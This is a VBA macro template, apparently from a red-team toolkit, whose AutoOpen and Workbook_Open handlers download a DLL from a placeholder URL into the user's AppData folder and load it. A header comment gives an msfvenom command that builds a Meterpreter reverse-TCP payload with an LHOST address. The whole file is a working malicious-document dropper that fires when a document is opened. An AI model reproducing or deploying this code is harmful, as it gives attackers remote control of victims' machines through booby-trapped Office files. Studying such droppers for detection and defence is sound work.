' Inspired by great work at: https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/
' Test with msfvenom.bat  -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f dll -o meter.dll

Sub AutoOpen()
    DropRunDll
End Sub

Sub Workbook_Open()
    DropRunDll
End Sub

Private Sub DropRunDll()
    ' Chdir to download directory
    Dim dll_Loc As String
    dll_Loc = Environ("AppData") & "\Microsoft\<<<APPLICATION>>>"
    If Dir(dll_Loc, vbDirectory) = vbNullString Then
        Exit Sub
    End If
    
    VBA.ChDir dll_Loc
    VBA.ChDrive "C"
    
    'Download DLL
    Dim dll_URL As String
    dll_URL = "<<<DLL_URL>>>"

    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    WinHttpReq.Open "GET", dll_URL, False
    WinHttpReq.send

    myURL = WinHttpReq.responseBody
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile "Document1.asd", 2
        oStream.Close
        ' Call module which contains export for downloaded DLL
        <<<MODULE_2>>>.Invoke 
    End If
End Sub
